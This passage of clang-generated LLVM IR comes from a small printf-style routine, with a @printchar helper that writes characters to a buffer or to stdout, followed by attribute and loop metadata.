  br i1 %83, label %84, label %90

84:                                               ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

90:                                               ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

93:                                               ; preds = %90, %84
  br label %94

94:                                               ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

102:                                              ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @printchar(i8** %0, i32 %1) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

7:                                                ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

15:                                               ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

18:                                               ; preds = %15, %7
  ret void
}

declare i64 @write(i32, i8*, i64) #5

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { argmemonly nofree nounwind willreturn writeonly }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nofree nosync nounwind willreturn }
attributes #5 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { nounwind returns_twice "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { noreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #8 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #9 = { argmemonly nofree nounwind willreturn }
attributes #10 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #11 = { nounwind readonly willreturn }
attributes #12 = { nounwind }
attributes #13 = { nounwind returns_twice }
attributes #14 = { noreturn }
attributes #15 = { nounwind readnone willreturn }
attributes #16 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
!38 = distinct !{!38, !7}
!39 = distinct !{!39, !7}
!40 = distinct !{!40, !7}
!41 = distinct !{!41, !7}
!42 = distinct !{!42, !7}
!43 = distinct !{!43, !7}
!44 = distinct !{!44, !7}
!45 = distinct !{!45, !7}
!46 = distinct !{!46, !7}
!47 = distinct !{!47, !7}
!48 = distinct !{!48, !7}
!49 = distinct !{!49, !7}
!50 = distinct !{!50, !7}
!51 = distinct !{!51, !7}
!52 = distinct !{!52, !7}
!53 = distinct !{!53, !7}
!54 = distinct !{!54, !7}
!55 = distinct !{!55, !7}
!56 = distinct !{!56, !7}
!57 = distinct !{!57, !7}
!58 = distinct !{!58, !7}
!59 = distinct !{!59, !7}
!60 = distinct !{!60, !7}
!61 = distinct !{!61, !7}
!62 = distinct !{!62, !7}
!63 = distinct !{!63, !7}
!64 = distinct !{!64, !7}
!65 = distinct !{!65, !7}
!66 = distinct !{!66, !7}
!67 = distinct !{!67, !7}
!68 = distinct !{!68, !7}
!69 = distinct !{!69, !7}
!70 = distinct !{!70, !7}
!71 = distinct !{!71, !7}
!72 = distinct !{!72, !7}
!73 = distinct !{!73, !7}
!74 = distinct !{!74, !7}
!75 = distinct !{!75, !7}
!76 = distinct !{!76, !7}
!77 = distinct !{!77, !7}
